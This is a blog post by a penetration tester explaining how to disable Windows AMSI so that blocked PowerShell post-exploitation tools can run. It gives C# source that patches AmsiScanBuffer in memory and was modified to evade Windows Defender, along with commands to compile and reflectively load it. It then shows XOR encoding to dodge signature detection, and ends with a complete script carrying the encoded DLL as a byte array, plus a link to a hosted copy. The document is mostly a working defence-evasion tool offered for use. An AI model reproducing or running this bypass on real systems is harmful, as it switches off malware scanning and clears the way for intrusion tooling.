---
layout: post
title: "Execute any \"evil\" Powershell code by bypassing AMSI"
author: "Mor Davidovich @Dec0ne"
---
Powershell can be a powerful tool during the post-exploitation phase of our engagements. It packs a lot of native tools that can help us enumerate further beyond our initial foothold and onto the rest of the AD network. Probably, one of the best advantages of Powershell is having access to awesome public scripts and tools like Empire, PowerSploit, Nishang and many others, but what if AMSI will not let us use any of these tools?

## What is AMSI?
AMSI stands for "Anti Malware Scan Interface" and it's job is to scan and block anything malicious.
Still don't know what I'm talking about? Perhaps this will help:
<img class="fill" src="/research/img/amsi-bypass-post/1.PNG?raw=true">
Obviously if you are experienced with pentesting in AD networks, you encountered this error with almost all public known scripts.

## How AMSI works exactly?
It uses a string based detection mechanism to detect “dangerous” commands and potentially malicious scripts.
Check out this example:
<img class="fill" src="/research/img/amsi-bypass-post/2.PNG?raw=true">
As you can see the word "amsiutils" is prohibited so any Powershell scripts containing this word will be blocked by AMSI.

## So how can we bypass it?
Good thing you asked because I got some examples for you.
String based detection are very easy to bypass - just refrain from using the banned string literally.
Here are some ways to execute banned string without actually using it:
<img class="fill" src="/research/img/amsi-bypass-post/3.PNG?raw=true">
By simply splitting the string you could fool AMSI and execute your banned string. This is a very common technique to use in obfuscation in general.
<img class="fill" src="/research/img/amsi-bypass-post/4.PNG?raw=true">
You can also encode your string to base64 - in most cases that will be enough to fool AMSI.
If all else fails we can encode the string to bytes and even use XOR to make it even harder for AMSI but we will discuss that towards the end of the post.
The examples above are mere workarounds though, and to do this with every online public scripts we want to use is simply impractical.
So how can we __disable__ AMSI?

## Disabling AMSI
After scouring the web for a bit searching for a practical way to disable AMSI I stumbled onto [CyberArk post](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/) in which he explains how he was able to disable AMSI using a memory patch to basically make AMSI execute all of its scans on a length of 0 (AKA not scanning anything). He provided a C# code that compiles into a DLL which we can load into Powershell and disable AMSI.
Unfortunately, CyberArk code's not longer valid. Apparently Windows Defender now blocks it so we can't even compile it, let alone load it into Powershell.
Upon further investigation and manipulation to the CyberArk code I managed to come up with this code that successfully evades Windows Defender:
```c#
using System;
using System.Runtime.InteropServices;

namespace BP
{
    public class AMS
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static void Disable()
        {
            IntPtr AMSDLL = LoadLibrary("amsi.dll");
            IntPtr AMSBPtr = GetProcAddress(AMSDLL, "Am" + "si" + "Scan" + "Buffer");
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            VirtualProtect(AMSBPtr, dwSize, 0x40, out Zero);
            Byte[] Patch1 = { 0x31 };
            Byte[] Patch2 = { 0xff };
            Byte[] Patch3 = { 0x90 };
            IntPtr unmanagedPointer1 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch1, 0, unmanagedPointer1, 1);
            MoveMemory(AMSBPtr + 0x001b, unmanagedPointer1, 1);
            IntPtr unmanagedPointer2 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch2, 0, unmanagedPointer2, 1);
            MoveMemory(AMSBPtr + 0x001c, unmanagedPointer2, 1);
            IntPtr unmanagedPointer3 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch3, 0, unmanagedPointer3, 1);
            MoveMemory(AMSBPtr + 0x001d, unmanagedPointer3, 1);
            Console.WriteLine("Memory patched successfuly.");
        }
    }
}
``` 
You can easily compile it into a DLL using Powershell:
```powershell
PS C:\Users\Mor> Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
```
To load it into Powershell we can use its native (.NET) API:
```powershell
PS C:\Users\Mor> [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
```
and to execute it, we simply call the now loaded function inside the DLL:
```powershell
PS C:\Users\Mor> [BP.AMS]::Disable()
```
This is how it looks in action:
<img class="fill" src="/research/img/amsi-bypass-post/5.PNG?raw=true">
As you can see, we are now able to use the string "amsiutils" literally. We have successfully disabled AMSI. Right now we can load any external Powershell script like PowerSploit or Nishang without AMSI blocking it.

## Putting it all together
Once we have everything working we should try to automate everything we can because during engagements we might not have the time or the ability to do all of the steps above.
I decided to encode the entire DLL to base64 and create a script that will automatically reflect it to memory and execute it.
To encode the dll to base64 I used this command:
```powershell
PS C:\Users\Mor> $encoded_dll_string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
```
<img class="fill" src="/research/img/amsi-bypass-post/6.PNG?raw=true">
The resulted string is the encoded DLL.

We can load it into memory like this:

```powershell
PS C:\Users\Mor> [Reflection.Assembly]::Load([Convert]::FromBase64String($encoded_dll_string)) | Out-Null
```
To my surprise, AMSI detected my encoded DLL string (or at least some part of it) as malicious and blocked it:
<img class="fill" src="/research/img/amsi-bypass-post/7.PNG?raw=true">
I managed to bypass this by splitting the string somewhere in the middle (after some trial and error) but in my final script I decided to go with something a bit more "long-term": ByteString + XOR
Since AMSI only detects strings and not logic I needed a way to represent the DLL code with a string that I could easily change whenever AMSI decides to ban it.

What I did is the following:
I loaded the DLL bytes in Powershell, ran the byte array through a XOR function and finally converted it to a ByteString.
```powershell
PS C:\Users\Mor> $byteArray = [IO.File]::ReadAllBytes("$pwd\\Source.dll")
PS C:\Users\Mor> $keyArray = @(12, 85, 65)
PS C:\Users\Mor> $keyPosition = 0
PS C:\Users\Mor> for($i=0; $i -lt $byteArray.count ; $i++)
				 {
					 $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]
				 	 $keyposition += 1
				 	 if ($keyposition -eq $keyArray.Length) {$keyposition = 0}
				 }
PS C:\Users\Mor> $byteString = ($byteArray | ForEach-Object ToString) -join ','
```
The only thing left to do is to copy the encoded ByteString into the final Powershell script and host it online for me to use whenever I need it. 
If for some reason AMSI will ever decide to block my encoded ByteString all I need to do is change the XOR key and copy the new encoded ByteString to the Powershell script and I'm good to go.

The final Powershell script:
```powershell
function AMSBP
{
	if (-not ([System.Management.Automation.PSTypeName]"BP.AMS").Type) {
		$byteArray = @(65,15,209,12,86,65,12,85,69,12,85,65,243,170,65,12,237,65,12,85,65,12,85,65,76,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,140,85,65,12,91,94,182,91,65,184,92,140,45,237,64,64,152,96,88,61,40,127,117,49,126,58,38,126,52,44,44,54,32,98,59,46,120,117,35,105,117,51,121,59,97,101,59,97,72,26,18,44,56,46,104,48,111,1,88,75,40,85,65,12,85,65,12,85,17,73,85,65,64,84,66,12,29,246,200,8,65,12,85,65,12,85,65,12,181,65,14,116,74,13,94,65,12,93,65,12,85,71,12,85,65,12,85,65,194,115,65,12,85,97,12,85,65,76,85,65,12,85,65,28,85,97,12,85,65,14,85,65,8,85,65,12,85,65,12,85,69,12,85,65,12,85,65,12,85,193,12,85,65,14,85,65,12,85,65,12,86,65,76,208,65,12,69,65,12,69,65,12,85,65,28,85,65,28,85,65,12,85,65,12,69,65,12,85,65,12,85,65,12,85,65,12,45,103,12,85,18,12,85,65,12,21,65,12,245,67,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,53,65,12,89,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,44,85,65,4,85,65,12,85,65,12,85,65,12,85,65,4,117,65,12,29,65,12,85,65,12,85,65,12,85,65,12,123,53,105,45,53,12,85,65,216,83,65,12,85,97,12,85,65,4,85,65,12,87,65,12,85,65,12,85,65,12,85,65,12,85,65,12,117,65,12,53,111,126,38,51,111,85,65,12,245,67,12,85,65,76,85,65,12,81,65,12,85,75,12,85,65,12,85,65,12,85,65,12,85,65,12,85,1,12,85,1,34,39,36,96,58,34,12,85,77,12,85,65,12,53,65,12,85,67,12,85,65,2,85,65,12,85,65,12,85,65,12,85,65,12,85,65,76,85,65,78,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,241,42,85,65,12,85,65,12,29,65,12,85,67,12,80,65,76,116,65,12,109,68,12,85,64,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,70,113,8,85,157,12,85,65,13,85,65,29,39,64,12,85,49,36,87,65,12,83,75,10,39,82,12,85,49,36,84,65,12,83,74,23,125,68,12,85,75,0,67,76,11,93,94,76,71,66,36,86,65,12,83,103,27,216,70,12,85,64,31,95,80,6,67,94,61,201,80,6,70,69,27,216,70,12,85,64,31,94,80,7,67,97,243,85,65,12,201,80,7,70,68,27,216,70,12,85,64,31,89,80,0,67,97,156,85,65,12,201,80,0,70,71,27,125,71,12,85,75,31,82,80,8,67,80,11,66,105,11,85,65,6,82,94,23,125,73,12,85,75,29,82,86,36,81,65,12,83,86,36,83,65,12,95,82,4,68,68,26,68,73,27,125,70,12,85,75,11,74,93,36,93,65,12,95,80,4,66,105,8,85,65,10,66,105,10,85,65,6,70,72,29,83,87,29,92,86,36,82,65,12,95,70,19,72,105,4,85,65,6,68,72,27,125,69,12,85,71,126,100,65,12,37,105,5,85,65,6,127,95,14,125,75,12,85,75,38,23,18,70,23,64,12,84,65,12,85,65,12,89,65,12,85,55,56,123,113,34,102,113,63,100,120,12,85,65,12,80,65,96,85,65,12,129,64,12,85,98,114,85,65,76,87,65,12,189,64,12,85,98,95,33,51,101,59,38,127,85,65,12,85,105,8,85,65,96,85,65,12,118,20,95,85,213,8,85,65,28,85,65,12,118,6,89,28,5,12,85,65,168,81,65,12,193,65,12,85,98,78,57,46,110,85,65,12,85,65,12,85,67,12,85,64,75,64,67,24,92,65,12,85,65,246,112,114,12,67,65,12,84,65,12,85,75,12,85,65,14,85,65,12,83,65,12,85,75,12,85,65,6,85,65,12,87,65,12,85,64,12,85,65,14,85,65,12,81,65,12,85,64,12,85,65,13,85,65,12,85,65,6,85,64,12,85,65,12,85,71,12,121,65,41,85,71,12,141,65,181,85,71,12,70,64,255,85,71,12,102,64,255,85,71,12,13,64,181,85,71,12,218,64,41,85,71,12,246,64,41,85,71,12,253,64,181,85,71,12,151,64,41,85,71,12,128,64,41,85,65,12,85,65,13,85,65,12,85,65,13,85,64,12,84,65,28,85,84,12,76,65,9,85,64,12,84,65,12,85,65,12,213,65,154,117,114,12,95,65,13,85,65,12,85,65,140,85,215,44,23,65,28,85,66,12,85,65,12,85,193,12,195,97,66,85,84,12,81,65,12,85,65,12,213,65,157,117,28,12,75,65,4,85,17,44,85,65,12,85,215,12,61,65,41,85,74,12,109,96,12,85,65,12,211,89,124,85,104,12,94,65,12,85,64,12,35,65,12,85,67,12,43,65,12,85,64,12,210,65,12,85,64,12,217,65,12,85,67,12,195,65,12,85,66,12,200,65,14,85,69,12,255,65,12,85,64,12,176,65,12,85,67,12,191,65,12,85,66,12,187,65,29,85,49,12,124,65,21,85,49,12,120,65,45,85,49,12,124,65,37,85,49,12,103,65,61,85,214,13,98,65,77,85,241,13,105,65,77,85,252,13,20,65,69,85,136,13,31,65,93,85,156,13,5,65,5,85,49,12,124,65,34,85,82,12,62,65,34,85,90,12,33,65,89,85,42,13,33,64,12,84,66,12,102,65,13,85,65,13,80,65,78,85,64,12,85,64,11,85,15,12,84,65,12,84,72,12,212,64,14,85,69,140,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,16,13,85,65,8,85,65,12,85,65,12,85,65,12,85,65,13,85,93,12,85,65,12,85,65,12,85,125,65,58,37,121,57,36,50,85,18,99,32,51,111,48,111,104,57,45,12,20,12,95,85,3,92,85,44,127,54,46,126,57,40,110,85,18,117,38,53,105,56,65,67,55,43,105,54,53,12,18,36,120,5,51,99,54,0,104,49,51,105,38,50,12,25,46,109,49,13,101,55,51,109,39,56,12,3,40,126,33,52,109,57,17,126,58,53,105,54,53,12,24,46,122,48,12,105,56,46,126,44,65,72,60,50,109,55,45,105,85,111,111,33,46,126,85,41,65,58,37,121,57,36,12,37,51,99,54,15,109,56,36,12,59,32,97,48,65,96,37,0,104,49,51,105,38,50,12,49,54,95,60,59,105,85,39,96,27,36,123,5,51,99,33,36,111,33,65,96,37,39,96,26,45,104,5,51,99,33,36,111,33,65,95,44,50,120,48,44,34,7,52,98,33,40,97,48,111,69,59,53,105,39,46,124,6,36,126,35,40,111,48,50,12,26,52,120,20,53,120,39,40,110,32,53,105,85,37,105,38,53,12,38,51,111,85,50,101,47,36,12,6,56,127,33,36,97,123,19,121,59,53,101,56,36,34,22,46,97,37,40,96,48,51,95,48,51,122,60,34,105,38,65,79,58,44,124,60,45,109,33,40,99,59,19,105,57,32,116,52,53,101,58,47,127,20,53,120,39,40,110,32,53,105,85,19,121,59,53,101,56,36,79,58,44,124,52,53,101,55,40,96,60,53,117,20,53,120,39,40,110,32,53,105,85,18,99,32,51,111,48,65,72,57,45,69,56,49,99,39,53,77,33,53,126,60,35,121,33,36,12,62,36,126,59,36,96,102,115,12,30,36,126,59,36,96,102,115,34,49,45,96,85,19,120,57,12,99,35,36,65,48,44,99,39,56,12,0,8,98,33,17,120,39,65,99,37,30,73,45,49,96,60,34,101,33,65,78,44,53,105,85,12,109,39,50,100,52,45,12,20,45,96,58,34,68,18,45,99,55,32,96,85,2,99,37,56,12,28,47,120,5,53,126,85,46,124,10,0,104,49,40,120,60,46,98,85,2,99,59,50,99,57,36,12,2,51,101,33,36,64,60,47,105,85,65,12,68,32,12,56,65,127,85,40,12,123,65,104,85,45,12,57,65,12,72,0,12,56,65,127,85,40,12,6,65,111,85,32,12,59,65,78,85,52,12,51,65,106,85,36,12,39,65,12,98,12,12,48,65,97,85,46,12,39,65,117,85,97,12,37,65,109,85,53,12,54,65,100,85,36,12,49,65,44,85,50,12,32,65,111,85,34,12,48,65,127,85,50,12,51,65,121,85,45,12,44,65,34,85,65,12,85,65,246,138,25,159,14,129,98,22,249,32,70,187,62,94,163,211,85,73,187,47,29,90,76,117,236,220,68,12,87,89,20,91,69,12,84,89,2,93,65,8,87,89,21,92,81,5,83,65,15,84,89,20,93,66,12,85,64,15,117,65,13,81,97,13,84,73,8,117,64,13,91,69,12,84,88,5,81,65,13,77,73,4,85,69,13,72,68,4,77,73,9,85,67,20,77,73,8,85,64,13,91,84,11,88,89,20,76,72,17,80,92,9,72,68,20,77,89,17,80,92,9,72,68,4,84,65,4,85,65,12,85,65,18,84,65,13,85,21,14,67,22,126,52,49,66,58,47,73,45,34,105,37,53,101,58,47,88,61,51,99,34,50,13,85,225,42,85,65,12,85,65,12,85,65,12,85,255,42,85,65,12,117,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,188,115,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,83,22,46,126,17,45,96,24,32,101,59,65,97,38,34,99,39,36,105,123,37,96,57,65,12,85,65,12,170,100,12,117,65,28,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,13,85,81,12,85,65,20,85,65,140,85,65,12,85,65,12,85,65,12,85,65,12,85,65,13,85,64,12,85,65,60,85,65,140,85,65,12,85,65,12,85,65,12,85,65,12,85,65,13,85,65,12,85,65,68,85,65,12,13,1,12,85,5,14,85,65,12,85,65,12,85,65,12,85,5,14,97,65,12,85,23,12,6,65,83,85,23,12,16,65,94,85,18,12,28,65,67,85,15,12,10,65,69,85,15,12,19,65,67,85,65,12,85,65,177,81,174,242,85,65,13,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,51,85,65,12,85,65,12,85,69,12,85,65,14,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,17,65,12,85,64,12,3,65,109,85,51,12,19,65,101,85,45,12,48,65,69,85,47,12,51,65,99,85,65,12,85,65,40,85,69,12,85,65,88,85,51,12,52,65,98,85,50,12,57,65,109,85,53,12,60,65,99,85,47,12,85,65,12,85,65,12,229,69,168,84,65,12,84,65,95,85,53,12,39,65,101,85,47,12,50,65,74,85,40,12,57,65,105,85,8,12,59,65,106,85,46,12,85,65,140,84,65,12,84,65,60,85,113,12,101,65,60,85,113,12,97,65,110,85,113,12,85,65,32,85,67,12,84,65,74,85,40,12,57,65,105,85,5,12,48,65,127,85,34,12,39,65,101,85,49,12,33,65,101,85,46,12,59,65,12,85,65,12,117,65,12,85,113,12,93,65,13,85,7,12,60,65,96,85,36,12,3,65,105,85,51,12,38,65,101,85,46,12,59,65,12,85,65,12,101,65,34,85,113,12,123,65,60,85,111,12,101,65,12,85,121,12,94,65,13,85,8,12,59,65,120,85,36,12,39,65,98,85,32,12,57,65,66,85,32,12,56,65,105,85,65,12,6,65,99,85,52,12,39,65,111,85,36,12,123,65,104,85,45,12,57,65,12,85,65,12,125,65,14,85,64,12,25,65,105,85,38,12,52,65,96,85,2,12,58,65,124,85,56,12,39,65,101,85,38,12,61,65,120,85,65,12,117,65,12,85,1,12,94,65,13,85,14,12,39,65,101,85,38,12,60,65,98,85,32,12,57,65,74,85,40,12,57,65,105,85,47,12,52,65,97,85,36,12,85,65,95,85,46,12,32,65,126,85,34,12,48,65,34,85,37,12,57,65,96,85,65,12,85,65,56,85,73,12,84,65,92,85,51,12,58,65,104,85,52,12,54,65,120,85,23,12,48,65,126,85,50,12,60,65,99,85,47,12,85,65,60,85,111,12,101,65,34,85,113,12,123,65,60,85,65,12,109,65,4,85,64,12,20,65,127,85,50,12,48,65,97,85,35,12,57,65,117,85,97,12,3,65,105,85,51,12,38,65,101,85,46,12,59,65,12,85,113,12,123,65,60,85,111,12,101,65,34,85,113,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,44,85,65,0,85,65,12,133,119,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12,85,65,12)
		$KeyArray = @(12, 85, 65)
		$keyposition = 0
		for ($i = 0; $i -lt $byteArray.count; $i++)
		{
			$byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]
			$keyposition += 1
			if ($keyposition -eq $keyArray.Length) { $keyposition = 0 }
		}
		[Reflection.Assembly]::Load([byte[]]$byteArray) | Out-Null
		Write-Output "DLL has been reflected"
	}
	[BP.AMS]::Disable()
}
```

Here is the final [hosted script](https://raw.githubusercontent.com/Dec0ne/AMS-BP/master/AMSBP.ps1) in action:
<img class="fill" src="/research/img/amsi-bypass-post/8.PNG?raw=true">

As you can see this technique is pretty simple to use and very useful when you wish to load some Powershell post-exploitation scripts that were once blocked by AMSI.

I hope you like this post like I enjoyed working on it. Hope you learned something new.
Thanks for CyberArk for sharing this technique.

Best regards,
Dec0ne
